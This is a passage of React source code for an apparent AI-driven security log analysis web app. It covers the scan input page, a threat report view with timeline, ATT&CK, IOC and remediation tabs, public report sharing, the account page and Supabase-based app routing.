                          {sevScans.length > 0 ? `Avg: ${Math.round(sevScans.reduce((a,s)=>a+(s.risk_score||0),0)/sevScans.length)}` : 'No scans'}
                        </div>
                      </Card>
                    );
                  })}
                </div>
              </>
            )}
          </div>
        )}
      </div>
    </div>
  );
}

// ══════════════════════════════════════════════════════════════
// NEW SCAN
// ══════════════════════════════════════════════════════════════
function NewScan({ onComplete, onBack }) {
  const [input, setInput] = useState('');
  const [file, setFile] = useState(null);
  const [state, setState] = useState('idle');
  const [error, setError] = useState('');
  const fileRef = useRef();

  return (
    <div className="min-h-screen bg-[#080a0e]">
      <div className="max-w-3xl mx-auto px-4 md:px-6 py-6 md:py-8">
        <div className="flex items-center gap-2 mb-8">
          <button onClick={onBack} className="text-slate-500 hover:text-white text-sm transition-colors">← Back</button>
          <span className="text-slate-700">/</span>
          <span className="text-sm text-slate-400">New Analysis</span>
        </div>

        {state === 'streaming' ? (
          <Card className="p-6 md:p-8">
            <StreamingAnalysis
              input={input}
              file={file}
              onComplete={(result) => { onComplete(result); }}
              onError={(msg) => { setState('error'); setError(msg); }}
            />
          </Card>
        ) : (
          <div className="space-y-4">
            <Card>
              <div className="flex items-center justify-between px-4 py-3 border-b border-white/[0.06]">
                <span className="text-sm font-medium text-white">Security Log Input</span>
                <div className="flex gap-3">
                  <button onClick={()=>{setInput(SAMPLE);setFile(null);}} className="text-xs text-blue-400 hover:text-blue-300 transition-colors">Load sample</button>
                  {(input||file) && <button onClick={()=>{setInput('');setFile(null);}} className="text-xs text-slate-600 hover:text-slate-400 transition-colors">Clear</button>}
                </div>
              </div>
              <textarea value={input} onChange={e=>{setInput(e.target.value);setFile(null);}}
                className="w-full bg-transparent font-mono text-emerald-400/80 text-xs p-4 resize-none focus:outline-none leading-relaxed min-h-56"
                placeholder={"Paste firewall logs, SIEM events, IOCs, network captures…\n\nClick 'Load sample' to see an example APT attack log."}
                spellCheck={false} />
            </Card>

            <div onClick={()=>fileRef.current?.click()} onDragOver={e=>e.preventDefault()}
              onDrop={e=>{e.preventDefault();const f=e.dataTransfer.files[0];if(f){setFile(f);setInput('');}}}
              className={`border-2 border-dashed rounded-2xl p-5 text-center cursor-pointer transition-all ${file?'border-emerald-500/40 bg-emerald-500/5':'border-white/10 hover:border-white/20'}`}>
              <input ref={fileRef} type="file" accept=".txt,.log,.json,.csv" className="hidden"
                onChange={e=>{const f=e.target.files[0];if(f){setFile(f);setInput('');}}} />
              {file ? (
                <div className="flex items-center justify-center gap-2 text-emerald-400 text-sm font-mono">
                  <span>📄</span><span>{file.name}</span><span className="text-emerald-600">({(file.size/1024).toFixed(1)} KB)</span>
                </div>
              ) : (
                <>
                  <p className="text-slate-500 text-sm">Drop a file here or <span className="text-blue-400">browse</span></p>
                  <p className="text-slate-700 text-xs mt-1">.txt · .log · .json · .csv · max 5 MB</p>
                </>
              )}
            </div>

            {error && <div className="bg-red-500/10 border border-red-500/20 rounded-xl p-4 text-red-400 text-sm">{error}</div>}

            <button onClick={()=>{if(!input.trim()&&!file){setError('Please paste log data or upload a file.');return;} setState('streaming');setError('');}}
              disabled={!input.trim()&&!file}
              className="w-full py-3 bg-blue-600 hover:bg-blue-500 disabled:bg-white/5 disabled:text-slate-600 text-white font-semibold rounded-xl transition-colors text-sm shadow-lg shadow-blue-600/20 disabled:shadow-none">
              🔴 Analyse with Live AI Stream
            </button>
            <p className="text-center text-slate-700 text-xs">Raw input is never stored · Results are private to your account</p>
          </div>
        )}
      </div>
    </div>
  );
}

// ══════════════════════════════════════════════════════════════
// REPORT
// ══════════════════════════════════════════════════════════════
function Report({ result, scanId, isPublic: initialPublic, onBack, onNewScan, onToast }) {
  const [tab, setTab] = useState('overview');
  const [tags, setTags] = useState([]);
  const [isPublicState, setIsPublicState] = useState(initialPublic || false);

  if (!result) return null;

  const tabs = [
    { id:'overview', label:'Overview', icon:'📋' },
    { id:'timeline', label:'Timeline', icon:'📅' },
    { id:'mitre', label:'ATT&CK', icon:'🗺️' },
    { id:'iocs', label:'IOCs', icon:'🎯' },
    { id:'remediation', label:'Actions', icon:'🔧' },
  ];

  return (
    <div className="min-h-screen bg-[#080a0e] print-container">

      {/* Print header (only shows in print) */}
      <div className="hidden print:block p-6 border-b border-gray-200 mb-6">
        <div className="flex items-center gap-3">
          <div className="text-2xl">🛡</div>
          <div>
            <h1 className="text-xl font-bold text-gray-900">AI Threat Analyzer Report</h1>
            <p className="text-gray-500 text-sm">{result.title || 'Security Incident Analysis'} · {new Date().toLocaleDateString('en-IN')}</p>
          </div>
        </div>
      </div>

      <div className="max-w-5xl mx-auto px-4 md:px-6 py-6 md:py-8">

        {/* Header */}
        <div className="no-print flex flex-wrap items-start justify-between gap-3 mb-6">
          <div>
            <div className="flex items-center gap-2 mb-2 text-sm">
              <button onClick={onBack} className="text-slate-500 hover:text-white transition-colors">← Back</button>
              <span className="text-slate-700">/</span>
              <span className="text-slate-400">Threat Report</span>
            </div>
            <div className="flex flex-wrap items-center gap-3">
              <h1 className="text-xl font-bold text-white">{result.title || 'Analysis Report'}</h1>
              <Badge level={result.severity} />
            </div>
          </div>
          <div className="flex flex-wrap items-center gap-2">
            {scanId && <ShareButton scanId={scanId} isPublic={isPublicState} onToast={onToast} />}
            <PDFButton />
            <button onClick={onNewScan} className="no-print px-4 py-1.5 bg-blue-600 hover:bg-blue-500 text-white text-xs font-medium rounded-lg transition-colors">
              + New Analysis
            </button>
          </div>
        </div>

        {/* Summary row */}
        <div className="grid grid-cols-1 lg:grid-cols-3 gap-4 mb-5">
          <Card className="p-5 flex items-center gap-5">
            <ScoreRing score={result.riskScore||0} />
            <div>
              <p className="text-slate-500 text-xs uppercase tracking-wider mb-2">Risk Score</p>
              <div className="flex flex-wrap gap-1.5">
                <span className="text-xs bg-white/5 border border-white/10 px-2 py-0.5 rounded text-slate-400">{result.mitreMapping?.length||0} techniques</span>
                <span className="text-xs bg-white/5 border border-white/10 px-2 py-0.5 rounded text-slate-400">{result.iocs?.length||0} IOCs</span>
                <span className="text-xs bg-white/5 border border-white/10 px-2 py-0.5 rounded text-slate-400">{result.affectedSystems?.length||0} systems</span>
              </div>
            </div>
          </Card>
          <Card className="lg:col-span-2 p-5">
            <p className="text-slate-500 text-xs uppercase tracking-wider mb-2">Executive Summary</p>
            <p className="text-slate-200 text-sm leading-relaxed">{result.summary}</p>
            {result.affectedSystems?.length > 0 && (
              <div className="flex flex-wrap gap-2 mt-3 pt-3 border-t border-white/[0.06]">
                {result.affectedSystems.map((sys,i) => {
                  const sl = sys.risk>75?'CRITICAL':sys.risk>50?'HIGH':sys.risk>25?'MEDIUM':'LOW';
                  return (
                    <span key={i} className={`text-xs font-mono px-2 py-0.5 rounded border ${getSev(sl).bg} ${getSev(sl).border} ${getSev(sl).text}`}>
                      {sys.host} <span className="opacity-50">({sys.risk}%)</span>
                    </span>
                  );
                })}
              </div>
            )}
          </Card>
        </div>

        {/* Tags */}
        {scanId && (
          <Card className="no-print p-4 mb-4">
            <TagEditor scanId={scanId} initialTags={tags} onUpdate={setTags} />
          </Card>
        )}

        {/* Report charts (always visible in print) */}
        <div className="grid grid-cols-1 md:grid-cols-2 gap-4 mb-5">
          <Card className="p-4">
            <h3 className="text-xs font-medium text-slate-500 uppercase tracking-wider mb-3">MITRE Tactic Coverage</h3>
            <div className="overflow-x-auto"><MitreMatrix mappings={result.mitreMapping||[]} /></div>
          </Card>
          <Card className="p-4">
            <h3 className="text-xs font-medium text-slate-500 uppercase tracking-wider mb-3">IOC Threat Distribution</h3>
            {result.iocs?.length > 0 ? (
              <ResponsiveContainer width="100%" height={150}>
                <BarChart data={['critical','high','medium','low'].map(t => ({ name:t.toUpperCase(), count:result.iocs.filter(i=>i.threat===t).length, fill:getSev(t).hex }))} margin={{top:0,right:0,left:-20,bottom:0}}>
                  <XAxis dataKey="name" tick={{fill:'#64748b',fontSize:9}} axisLine={false} tickLine={false} />
                  <YAxis allowDecimals={false} tick={{fill:'#64748b',fontSize:9}} axisLine={false} tickLine={false} />
                  <Tooltip contentStyle={{background:'#0f1117',border:'1px solid rgba(255,255,255,0.1)',borderRadius:'8px',fontSize:'11px'}} itemStyle={{color:'#e2e8f0'}} />
                  <Bar dataKey="count" radius={[3,3,0,0]}>
                    {['critical','high','medium','low'].map((t,i) => <Cell key={i} fill={getSev(t).hex} opacity={0.8} />)}
                  </Bar>
                </BarChart>
              </ResponsiveContainer>
            ) : <div className="flex items-center justify-center h-36 text-slate-600 text-sm">No IOCs found</div>}
          </Card>
        </div>

        {/* Tabs */}
        <div className="no-print flex gap-1 mb-5 bg-white/[0.03] border border-white/[0.06] rounded-xl p-1 overflow-x-auto">
          {tabs.map(t => (
            <button key={t.id} onClick={()=>setTab(t.id)}
              className={`flex-1 flex items-center justify-center gap-1.5 py-2 px-2 rounded-lg text-xs font-medium transition-all whitespace-nowrap ${tab===t.id?'bg-white/10 text-white':'text-slate-500 hover:text-slate-300'}`}>
              <span>{t.icon}</span>
              <span className="hidden sm:inline">{t.label}</span>
            </button>
          ))}
        </div>

        {/* Overview */}
        {(tab==='overview') && (
          <div className="space-y-4">
            <Card>
              <div className="px-5 py-4 border-b border-white/[0.06]"><h3 className="font-semibold text-sm text-white">Affected Systems</h3></div>
              <div className="divide-y divide-white/[0.04]">
                {(result.affectedSystems||[]).map((sys,i) => {
                  const sl = sys.risk>75?'CRITICAL':sys.risk>50?'HIGH':sys.risk>25?'MEDIUM':'LOW';
                  return (
                    <div key={i} className="px-5 py-3.5 flex items-center gap-4">
                      <div className={`w-2 h-2 rounded-full flex-shrink-0 ${getSev(sl).dot}`} />
                      <span className="font-mono text-sm text-white flex-1 truncate">{sys.host}</span>
                      <span className="text-xs text-slate-500 hidden sm:block truncate max-w-xs">{sys.status}</span>
                      <div className="flex items-center gap-3 flex-shrink-0">
                        <div className="w-16 md:w-24 h-1.5 bg-white/5 rounded-full overflow-hidden">
                          <div className="h-full rounded-full" style={{width:`${sys.risk}%`, background:sys.risk>75?'#ef4444':sys.risk>50?'#f97316':'#f59e0b', transition:'width 0.8s ease'}} />
                        </div>
                        <span className={`text-xs font-bold font-mono w-10 text-right ${getSev(sl).text}`}>{sys.risk}%</span>
                      </div>
                    </div>
                  );
                })}
              </div>
            </Card>
          </div>
        )}

        {/* Timeline */}
        {tab==='timeline' && (
          <Card>
            <div className="px-5 py-4 border-b border-white/[0.06]">
              <h3 className="font-semibold text-sm text-white">Attack Timeline</h3>
              <p className="text-slate-500 text-xs mt-0.5">Chronological reconstruction of observed events</p>
            </div>
            <div className="p-5">
              <div className="relative">
                <div className="absolute left-[5px] top-2 bottom-2 w-px bg-white/[0.06]" />
                <div className="space-y-5">
                  {(result.timeline||[]).map((ev,i) => (
                    <div key={i} className="flex gap-4">
                      <div className={`w-3 h-3 rounded-full flex-shrink-0 mt-1 border-2 border-[#0f1117] ${getSev(ev.severity).dot}`} />
                      <div className="flex-1">
                        <div className="flex flex-wrap items-center gap-2 mb-1.5">
                          <span className="font-mono text-xs text-slate-500 bg-white/[0.04] px-2 py-0.5 rounded">{ev.time}</span>
                          <Badge level={ev.severity} />
                          {ev.tactic && <span className="text-xs bg-blue-500/10 border border-blue-500/20 text-blue-400 px-2 py-0.5 rounded font-mono">{ev.tactic}</span>}
                        </div>
                        <p className="text-slate-200 text-sm leading-relaxed">{ev.event}</p>
                      </div>
                    </div>
                  ))}
                </div>
              </div>
            </div>
          </Card>
        )}

        {/* MITRE */}
        {tab==='mitre' && (
          <div className="space-y-4">
            <Card>
              <div className="px-5 py-4 border-b border-white/[0.06]"><h3 className="font-semibold text-sm text-white">ATT&CK Matrix</h3></div>
              <div className="p-5 overflow-x-auto"><MitreMatrix mappings={result.mitreMapping||[]} /></div>
            </Card>
            <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
              {(result.mitreMapping||[]).map((m,i) => (
                <Card key={i} className="p-4">
                  <div className="flex items-center justify-between mb-2">
                    <span className="font-mono text-xs font-bold text-blue-400 bg-blue-500/10 border border-blue-500/20 px-2 py-0.5 rounded">{m.technique}</span>
                    <span className="text-xs text-slate-600">{m.confidence}% conf.</span>
                  </div>
                  <p className="font-semibold text-sm text-white mb-0.5">{m.name}</p>
                  <p className="text-xs text-slate-500 font-mono mb-2">{m.tactic}</p>
                  <div className="h-0.5 bg-white/5 rounded-full overflow-hidden">
                    <div className="h-full bg-blue-500 rounded-full" style={{width:`${m.confidence}%`}} />
                  </div>
                </Card>
              ))}
            </div>
          </div>
        )}

        {/* IOCs */}
        {tab==='iocs' && (
          <div className="space-y-3">
            {(result.iocs||[]).map((ioc,i) => (
              <Card key={i} className="p-4">
                <div className="flex flex-wrap items-start gap-3">
                  <div className="flex items-center gap-2 flex-shrink-0 pt-0.5">
                    <span className={`text-xs font-mono font-semibold px-2.5 py-1 rounded-md border ${getSev(ioc.threat).bg} ${getSev(ioc.threat).border} ${getSev(ioc.threat).text}`}>{ioc.type}</span>
                    <Badge level={ioc.threat} />
                  </div>
                  <div className="flex-1 min-w-0">
                    <div className="flex items-center gap-2">
                      <p className="font-mono text-sm text-red-300 break-all font-medium">{ioc.value}</p>
                      <button onClick={() => {navigator.clipboard.writeText(ioc.value);}}
                        className="no-print text-slate-600 hover:text-slate-300 text-xs transition-colors flex-shrink-0" title="Copy to clipboard">
                        📋
                      </button>
                    </div>
                    <p className="text-slate-400 text-xs leading-relaxed mt-1">{ioc.description}</p>
                  </div>
                </div>
              </Card>
            ))}
          </div>
        )}

        {/* Remediation */}
        {tab==='remediation' && (
          <div className="space-y-3">
            {(result.remediation||[]).sort((a,b)=>a.priority-b.priority).map((step,i) => {
              const catStyle = {
                Containment:'bg-red-500/10 border-red-500/20 text-red-400',
                Eradication:'bg-orange-500/10 border-orange-500/20 text-orange-400',
                Recovery:'bg-emerald-500/10 border-emerald-500/20 text-emerald-400',
                Hardening:'bg-blue-500/10 border-blue-500/20 text-blue-400',
              }[step.category] || 'bg-slate-500/10 border-slate-500/20 text-slate-400';
              return (
                <Card key={i} className={step.urgent?'border-red-500/20':''}>
                  <div className="p-4 flex gap-4">
                    <div className={`w-8 h-8 rounded-lg flex items-center justify-center text-sm font-black flex-shrink-0 ${step.urgent?'bg-red-500/20 text-red-400':'bg-white/5 text-slate-500'}`}>
                      {step.priority}
                    </div>
                    <div className="flex-1">
                      <div className="flex flex-wrap items-center gap-2 mb-2">
                        <span className={`text-xs font-medium px-2.5 py-0.5 rounded-md border ${catStyle}`}>{step.category}</span>
                        {step.urgent && <span className="text-xs font-bold px-2.5 py-0.5 rounded-md bg-red-500/10 border border-red-500/20 text-red-400 flex items-center gap-1"><span className="w-1.5 h-1.5 rounded-full bg-red-500 animate-pulse" />URGENT</span>}
                      </div>
                      <p className="text-slate-200 text-sm leading-relaxed">{step.action}</p>
                    </div>
                  </div>
                </Card>
              );
            })}
          </div>
        )}

      </div>
    </div>
  );
}

// ══════════════════════════════════════════════════════════════
// PUBLIC REPORT (shared link viewer, no auth)
// ══════════════════════════════════════════════════════════════
function PublicReport({ scanId, onSignup }) {
  const [scan, setScan] = useState(null);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState('');

  useEffect(() => {
    fetch(`${API}/api/public/${scanId}`)
      .then(r => r.json())
      .then(d => { if (d.scan) setScan(d.scan); else setError('Report not found or no longer public.'); })
      .catch(() => setError('Failed to load report.'))
      .finally(() => setLoading(false));
  }, [scanId]);

  if (loading) return (
    <div className="min-h-screen bg-[#080a0e] flex items-center justify-center">
      <div className="w-6 h-6 rounded-full border-2 border-blue-500/30 border-t-blue-500 animate-spin" />
    </div>
  );

  if (error) return (
    <div className="min-h-screen bg-[#080a0e] flex items-center justify-center p-6 text-center">
      <div>
        <div className="text-4xl mb-4">🔒</div>
        <p className="text-white font-semibold mb-2">{error}</p>
        <button onClick={onSignup} className="mt-4 px-5 py-2 bg-blue-600 hover:bg-blue-500 text-white text-sm font-medium rounded-lg transition-colors">
          Create Free Account
        </button>
      </div>
    </div>
  );

  return (
    <div className="min-h-screen bg-[#080a0e]">
      {/* Banner */}
      <div className="bg-blue-600/10 border-b border-blue-600/20 px-6 py-3 flex items-center justify-between">
        <div className="flex items-center gap-2">
          <div className="w-6 h-6 rounded-lg bg-blue-600 flex items-center justify-center text-xs">🛡</div>
          <span className="text-white font-bold text-sm">ThreatAnalyzer</span>
          <span className="text-blue-400 text-xs ml-1">Shared Report</span>
        </div>
        <button onClick={onSignup} className="px-3 py-1.5 bg-blue-600 hover:bg-blue-500 text-white text-xs font-medium rounded-lg transition-colors">
          Get Free Account →
        </button>
      </div>
      <Report result={scan.result} scanId={null} onBack={() => {}} onNewScan={onSignup} onToast={() => {}} />
    </div>
  );
}

// ══════════════════════════════════════════════════════════════
// ACCOUNT
// ══════════════════════════════════════════════════════════════
function Account({ user, onBack, onSignOut }) {
  return (
    <div className="min-h-screen bg-[#080a0e]">
      <div className="max-w-md mx-auto px-6 py-8">
        <div className="flex items-center gap-2 mb-8">
          <button onClick={onBack} className="text-slate-500 hover:text-white text-sm transition-colors">← Back</button>
          <span className="text-slate-700">/</span>
          <span className="text-sm text-slate-400">Account</span>
        </div>
        <Card className="p-6 mb-4">
          <div className="flex items-center gap-4 mb-5 pb-5 border-b border-white/[0.06]">
            <div className="w-10 h-10 rounded-full bg-blue-600/20 border border-blue-600/30 flex items-center justify-center text-blue-400 font-bold">
              {user?.email?.[0]?.toUpperCase()}
            </div>
            <div>
              <p className="font-semibold text-sm text-white">{user?.email}</p>
              <p className="text-xs text-slate-500">Free account · Unlimited scans</p>
            </div>
          </div>
          <div className="space-y-3">
            {[['Email',user?.email],['Member since',new Date(user?.created_at).toLocaleDateString('en-IN',{dateStyle:'long'})],['Plan','Free — unlimited scans']].map(([l,v]) => (
              <div key={l} className="flex justify-between">
                <span className="text-xs text-slate-500">{l}</span>
                <span className="text-xs text-slate-300 font-medium">{v}</span>
              </div>
            ))}
          </div>
        </Card>
        <button onClick={onSignOut} className="w-full py-2.5 bg-white/[0.03] hover:bg-white/[0.06] border border-white/[0.06] text-slate-400 hover:text-white text-sm font-medium rounded-xl transition-colors">
          Sign Out
        </button>
      </div>
    </div>
  );
}

// ══════════════════════════════════════════════════════════════
// ROOT APP
// ══════════════════════════════════════════════════════════════
export default function App() {
  const [page, setPage]       = useState('landing');
  const [user, setUser]       = useState(null);
  const [result, setResult]   = useState(null);
  const [scanId, setScanId]   = useState(null);
  const [scanPublic, setScanPublic] = useState(false);
  const [toast, setToast]     = useState(null);
  const [ready, setReady]     = useState(false);
  const [sharedId, setSharedId] = useState(null);

  useEffect(() => {
    // Check for shared report in URL
    const sid = getSharedIdFromUrl();
    if (sid) { setSharedId(sid); setPage('public'); setReady(true); return; }

    supabase.auth.getSession().then(({ data }) => {
      if (data.session?.user) { setUser(data.session.user); setPage('dashboard'); }
      setReady(true);
    });
    const { data: sub } = supabase.auth.onAuthStateChange((_e, session) => {
      setUser(session?.user || null);
      if (!session) setPage('landing');
    });
    return () => sub.subscription.unsubscribe();
  }, []);

  const showToast = (message, type='info') => setToast({ message, type });

  async function signOut() {
    await supabase.auth.signOut();
    setUser(null); setPage('landing');
  }

  if (!ready) return (
    <div className="min-h-screen bg-[#080a0e] flex items-center justify-center">
      <div className="w-6 h-6 rounded-full border-2 border-blue-500/30 border-t-blue-500 animate-spin" />
    </div>
  );

  return (
    <div className="min-h-screen bg-[#080a0e] text-white">
      {toast && <Toast {...toast} onClose={()=>setToast(null)} />}

      {/* Nav — shown on all logged-in pages */}
      {user && !['landing','login','signup','public'].includes(page) && (
        <header className="no-print border-b border-white/[0.06] bg-[#080a0e]/90 backdrop-blur sticky top-0 z-40">
          <div className="max-w-5xl mx-auto px-4 md:px-6 h-14 flex items-center justify-between">
            <button onClick={()=>setPage('dashboard')} className="flex items-center gap-2">
              <div className="w-7 h-7 rounded-lg bg-blue-600 flex items-center justify-center text-sm">🛡</div>
              <span className="font-bold text-white tracking-tight hidden sm:block">ThreatAnalyzer</span>
              <span className="text-[10px] font-mono text-blue-400 bg-blue-500/10 border border-blue-500/20 px-1.5 py-0.5 rounded ml-1">AI</span>
            </button>
            <div className="flex items-center gap-1">
              <button onClick={()=>setPage('scan')} className="flex items-center gap-1.5 px-3 py-1.5 bg-blue-600 hover:bg-blue-500 text-white text-xs md:text-sm font-medium rounded-lg transition-colors">
                + New Scan
              </button>
              <button onClick={()=>setPage('account')} className="px-3 py-1.5 text-slate-400 hover:text-white text-sm transition-colors rounded-lg hover:bg-white/5">
                Account
              </button>
            </div>
          </div>
        </header>
      )}

      {page==='public' && sharedId && <PublicReport scanId={sharedId} onSignup={()=>{window.history.pushState({},'','/');setPage('signup');}} />}
      {page==='landing' && <Landing onLogin={()=>setPage('login')} onSignup={()=>setPage('signup')} />}
      {(page==='login'||page==='signup') && <Auth mode={page} onSuccess={u=>{setUser(u);setPage('dashboard');}} onSwitch={()=>setPage(page==='login'?'signup':'login')} />}
      {page==='dashboard'&&user && (
        <Dashboard user={user} onNewScan={()=>setPage('scan')}
          onViewScan={async id=>{
            try {
              const d = await apiFetch(`/api/scans/${id}`);
              setResult(d.scan.result);
              setScanId(d.scan.id);
              setScanPublic(d.scan.is_public||false);
              setPage('report');
            } catch(e) { showToast(e.message,'error'); }
          }} />
      )}
      {page==='scan'&&user && (
        <NewScan
          onComplete={(r, sid) => { setResult(r); setScanId(sid||null); setScanPublic(false); setPage('report'); }}
          onBack={()=>setPage('dashboard')} />
      )}
      {page==='report'&&result && (
        <Report result={result} scanId={scanId} isPublic={scanPublic}
          onBack={()=>setPage('dashboard')} onNewScan={()=>setPage('scan')} onToast={showToast} />
      )}
      {page==='account'&&user && <Account user={user} onBack={()=>setPage('dashboard')} onSignOut={signOut} />}
    </div>
  );
}
